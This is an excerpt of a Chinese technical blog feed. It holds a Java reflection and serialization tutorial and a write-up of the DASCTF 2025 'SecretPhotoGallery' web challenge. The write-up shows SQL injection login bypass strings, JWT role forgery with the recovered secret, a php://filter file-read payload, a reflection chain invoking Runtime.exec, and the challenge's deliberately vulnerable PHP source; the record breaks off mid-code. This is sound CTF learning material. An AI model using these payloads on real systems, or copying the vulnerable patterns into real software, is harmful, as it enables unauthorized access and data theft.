href="#ReflectField类演示如何使用反射修改私有属性" class="headerlink" title="ReflectField类演示如何使用反射修改私有属性"></a><code>ReflectField</code>类演示如何使用反射修改私有属性</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectField</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;李四&quot;</span>, <span class="number">30</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = person.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取public字段</span></span><br><span class="line">         Field[] fields = clazz.getFields();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取所有字段（包括私有）</span></span><br><span class="line">        Field[] allFields = clazz.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Field field : allFields) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;字段名: &quot;</span> + field.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;字段类型: &quot;</span> + field.getType());</span><br><span class="line">            System.out.println(<span class="string">&quot;修饰符: &quot;</span> + Modifier.toString(field.getModifiers()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 访问私有字段</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        ageField.setAccessible(<span class="literal">true</span>); <span class="comment">// 设置可访问私有字段</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ageValue</span> <span class="operator">=</span> (<span class="type">int</span>) ageField.get(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;年龄: &quot;</span> + ageValue);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改私有字段</span></span><br><span class="line">        ageField.set(person, <span class="number">13</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;修改后年龄: &quot;</span> + person.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射从<code>Class&lt;?&gt; clazz = person.getClass();</code>开始，这里获取了<code>person</code>对象运行时的类信息，利用<code>getDeclaredField()</code>获取字段，然后利用<code>setAccessible()</code>设置字段可访问，最后使用<code>set(对象实例,修改后的值)</code>方法实现对象字段的修改</p><blockquote><p>可以注意到在获取修饰符时的代码明显更加复杂，因为修饰符本质上是一个int类型的位掩码(bitmask)，在获取修饰符后还需要使用<code>Modifier.toString()</code>方法将其转化为可读的字符串</p></blockquote><blockquote><p><code>Field</code>的<code>get</code>方法返回的是一个<code>Object</code>对象， <code>int ageValue = (int) ageField.get(person)</code>这一段进行了强转，也是成功照应上文</p></blockquote><h3 id="ReflectMethod类演示如何使用反射调用私有方法"><a href="#ReflectMethod类演示如何使用反射调用私有方法" class="headerlink" title="ReflectMethod类演示如何使用反射调用私有方法"></a><code>ReflectMethod</code>类演示如何使用反射调用私有方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectMethod</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>, <span class="number">28</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = person.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取所有方法</span></span><br><span class="line">        Method[] methods = clazz.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取特定方法并调用</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">setNameMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        setNameMethod.invoke(person, <span class="string">&quot;孙七&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getNameMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) getNameMethod.invoke(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名: &quot;</span> + name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用私有方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">privateMethod</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;testMethod&quot;</span>);</span><br><span class="line">        privateMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        privateMethod.invoke(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧从<code>Class&lt;?&gt; clazz = person.getClass();</code>出发，使用<code>getMethod(方法名,参数类型数组)</code>获得<code>Method</code>对象，使用<code>setAccessible()</code>获得调用权，之后对其可以使用<code>invoke(对象实例,方法参数值数组)</code>调用，若要调用的方法无参则可省略 </p><blockquote><p>相信都注意到到了<code>String name = (String) getNameMethod.invoke(person);</code>这里又来了一次强转，因为这里返回的又是一个<code>Object</code>对象(万金油了属于是)</p></blockquote><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>最近看题看到别人写的反射调用方法的方法，这里说说运行逻辑</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">default</span> Object <span class="title function_">wagTail</span><span class="params">(Object input, String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(methodName, paramTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>Class cls = input.getClass();</code>，是不是很眼熟？这里就是前面说反射的开始，<code>cls</code>获取了<code>input</code>运行时类的信息，后面就是获得方法名、调用方法。原题用了一个几个<code>Dog</code>对象，实例化时的参数刚好能一一对应</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Dog</span> <span class="variable">dog1</span> <span class="operator">=</span> setDog(Runtime.class,<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;);</span><br><span class="line"><span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> setDog(Runtime.class,<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;);</span><br><span class="line"><span class="type">Dog</span> <span class="variable">dog3</span> <span class="operator">=</span> setDog(Runtime.class,<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p>原题对三个<code>Dog</code>对象进行了链式调用，这里的三个<code>Dog</code>对象其实只有第一个对象的<code>Runtime.class</code>被使用了，其他的都被循环覆盖掉了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">chainWagTail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Dog dog : <span class="built_in">this</span>.dogs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">                input = dog.object;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> dog.wagTail(input, dog.methodName, dog.paramTypes, dog.args);</span><br><span class="line">            input = result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第一次调用了<code>Runtime.class.getMethod(&quot;getRuntime&quot;, null);</code>，得到<code>Runtime.getRuntime()</code>方法的<code>Method</code>对象</p><p>第二次调用了<code>getRuntime.invoke();</code>，得到了一个<code>Runtime</code>实例</p><p>第三次调用了<code>runtimeInstance.exec(&quot;calc&quot;);</code>启动了计算器进程</p><br/><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>在Java中，序列化是将对象转化为二进制字节流输出的过程，反序列化则是其逆过程。若要让一个类具有序列化能力，需要调用<code>Serialize</code>接口，该接口不需要实现任何方法，用来标识该类可以进行序列恶化操作。在Java中，序列化和反序列化的可自定义程度是非常高的，不同的开发者都可以自己定义出一套独特的序列化逻辑</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(String base64Data)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        ByteArrayInputStream bais=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64Data));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，进行序列化操作的实则只有<code>oos.writeObject(obj);</code>这一行代码，反序列化操作也只有<code>ois.readObject();</code>是在从字节流中读取对象。学习了一些Java后知道，由于<code>writeObject()</code>和<code>readObject()</code></p><p>分别是<code>ObjectOutputStream</code>和<code>ObjectInputStream</code>类中具有的方法，所以第二行也不难理解。第一行的作用是创建内存缓冲区，这代表我们序列化的对象会被放入内存中存储，然后将内存中的数据进行编码后返回。除此以外，还可以将序列化后的数据写入文件或者进行压缩、加密等操作，自定义程度极高</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 假设要序列化的类中有transient字段</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 先执行默认序列化</span></span><br><span class="line">        oos.defaultWriteObject();</span><br><span class="line">        <span class="comment">// 额外序列化transient字段（自定义加密）</span></span><br><span class="line">        oos.writeUTF(encrypt(<span class="built_in">this</span>.password));</span><br><span class="line">        <span class="comment">// 添加时间戳</span></span><br><span class="line">        oos.writeLong(System.currentTimeMillis());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> </span><br><span class="line">            <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 先执行默认反序列化</span></span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// 读取元数据（但不存储到字段）</span></span><br><span class="line">        <span class="built_in">this</span>.password = decrypt(ois.readUTF());</span><br><span class="line">        <span class="comment">// 读取额外信息</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">timestamp</span> <span class="operator">=</span> ois.readLong();</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化时间: &quot;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>(timestamp));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h3><p><code>Serialize</code>接口的实现类都会计算出一个<code>serialVersionUID</code>常量，反序列化时计算出来的数值与JVM运行中类的值不一致会造成<code>InvalidClassException</code>异常，可以在要序列化的类中声明该值以避免报错</p><br/>]]></content>
      
      
      <categories>
          
          <category> 零碎 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 拾遗补阙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>散题12.10</title>
      <link href="/2025/12/10/%E6%95%A3%E9%A2%9812-10/"/>
      <url>/2025/12/10/%E6%95%A3%E9%A2%9812-10/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF-2025下半年赛-SecretPhotoGallery"><a href="#DASCTF-2025下半年赛-SecretPhotoGallery" class="headerlink" title="[DASCTF 2025下半年赛]SecretPhotoGallery"></a>[DASCTF 2025下半年赛]SecretPhotoGallery</h1><blockquote><p>This is a mysterious gallery system, but the sqlite database is empty, is it?</p></blockquote><p>打开是登录界面，题目说了是sqlite数据库，用<code>1&#39; and 1=1</code>测试存在注入报错，用<code>&#39; ORDER BY 4--</code>确定列数为3，后面<code>&#39; UNION SELECT &#39;col1&#39;,NULL,NULL--</code>测试显示数据时直接登进去了，神秘，不是太理解</p><p>登进去后是<code>gallery.php</code>路由，页面有提示</p><blockquote><p>You’ve successfully entered the gallery. Your authentication token shows you’re a <strong>guest</strong> user.</p></blockquote><p>看看cookie，显示</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiJyBVTklPTiBTRUxFQ1QgJ2NvbDEnLE5VTEwsTlVMTC0tIiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzY0OTk0ODEwfQ.SYBQFPNuD60CywLf9_C-_sJ3dGwd-9p_4sW8jzqq-lU</span><br></pre></td></tr></table></figure><p>cookie被<code>.</code>拆成了三部分，是JWT密钥，接下来尝试获取JWT密钥。使用<code>hashcat</code>用<code>rockyou.txt</code>字典爆破失败，<code>rockyou.txt</code>有几千万条数据都不匹配，说明密钥是藏起来了</p><p>在<code>gallery.php</code>查看页面源代码，发现每张图片上面都有神秘注释，比如第一张图片是<code>&lt;!-- Photo 1: G --&gt;</code>，把17张照片的注释字符组合可以得到<code>GALLERY2024SECRET</code>，这就是JWT密钥，用在线的JWT密钥生成器，把<code>guest</code>属性更改为<code>admin</code>，刷新页面可以进入一个新路由<code>admin.php</code></p><p>该路由是一个文件读取页面，经过测试可以利用绝对路径读取任意文件，但是<code>flag.txt</code>是不存在的，使用伪协议<code>php://filter/convert.iconv.utf-8.utf-16/resource=index.php</code>可以读取之前的源码</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// JWT Helper Functions</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64UrlEncode</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">strtr</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createJWT</span>(<span class="params"><span class="variable">$payload</span>, <span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$header</span> = <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;typ&#x27;</span> =&gt; <span class="string">&#x27;JWT&#x27;</span>, <span class="string">&#x27;alg&#x27;</span> =&gt; <span class="string">&#x27;HS256&#x27;</span>]);</span><br><span class="line">    <span class="variable">$header</span> = <span class="title function_ invoke__">base64UrlEncode</span>(<span class="variable">$header</span>);</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$payload</span>));</span><br><span class="line">    <span class="variable">$signature</span> = <span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&quot;<span class="subst">$header</span>.<span class="subst">$payload</span>&quot;</span>, <span class="variable">$secret</span>, <span class="literal">true</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;<span class="subst">$header</span>.<span class="subst">$payload</span>.<span class="subst">$signature</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If already logged in, redirect to gallery</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: gallery.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize database</span></span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;/tmp/gallery.db&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create users table (empty database)</span></span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Vulnerable SQL query - direct string concatenation</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>()) &#123;</span><br><span class="line">        <span class="comment">// Generate JWT token with weak secret</span></span><br><span class="line">        <span class="comment">// The secret will be hidden in the gallery photos!</span></span><br><span class="line">        <span class="variable">$jwtSecret</span> = <span class="string">&#x27;GALLERY2024SECRET&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$payload</span> = [</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">            <span class="string">&#x27;role&#x27;</span> =&gt; <span class="string">&#x27;guest&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;iat&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>()</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$token</span> = <span class="title function_ invoke__">createJWT</span>(<span class="variable">$payload</span>, <span class="variable">$jwtSecret</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set JWT as cookie</span></span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="variable">$token</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Also keep session for compatibility</span></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: gallery.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;Invalid username or password!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>gallery.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Check if logged in via JWT cookie</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Decode JWT to get username (basic decoding, no verification here)</span></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>];</span><br><span class="line"><span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$parts</span>) === <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strtr</span>(<span class="variable">$parts</span>[<span class="number">1</span>], <span class="string">&#x27;-_&#x27;</span>, <span class="string">&#x27;+/&#x27;</span>)), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$payload</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="string">&#x27;Guest&#x27;</span>;</span><br><span class="line">    <span class="variable">$role</span> = <span class="variable">$payload</span>[<span class="string">&#x27;role&#x27;</span>] ?? <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>admin.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// JWT Helper Functions</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64UrlDecode</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strtr</span>(<span class="variable">$data</span>, <span class="string">&#x27;-_&#x27;</span>, <span class="string">&#x27;+/&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyJWT</span>(<span class="params"><span class="variable">$token</span>, <span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$parts</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$header</span>, <span class="variable">$payload</span>, <span class="variable">$signature</span>) = <span class="variable">$parts</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Verify signature</span></span><br><span class="line">    <span class="variable">$validSignature</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">strtr</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&quot;<span class="subst">$header</span>.<span class="subst">$payload</span>&quot;</span>, <span class="variable">$secret</span>, <span class="literal">true</span>)), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$signature</span> !== <span class="variable">$validSignature</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decode payload</span></span><br><span class="line">    <span class="variable">$payloadData</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64UrlDecode</span>(<span class="variable">$payload</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$payloadData</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if JWT token exists</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try to decode JWT (we need to know the secret!)</span></span><br><span class="line"><span class="comment">// The secret is hidden in the gallery photos: GALLERY2024SECRET</span></span><br><span class="line"><span class="variable">$jwtSecret</span> = <span class="string">&#x27;GALLERY2024SECRET&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">verifyJWT</span>(<span class="variable">$token</span>, <span class="variable">$jwtSecret</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$payload</span>) &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&quot;Invalid JWT token! Unable to verify signature.&quot;</span>;</span><br><span class="line">    <span class="variable">$isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$payload</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="string">&#x27;Unknown&#x27;</span>;</span><br><span class="line">    <span class="variable">$role</span> = <span class="variable">$payload</span>[<span class="string">&#x27;role&#x27;</span>] ?? <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="variable">$isAdmin</span> = (<span class="variable">$role</span> === <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle file export functionality</span></span><br><span class="line"><span class="variable">$fileContent</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$exportError</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span 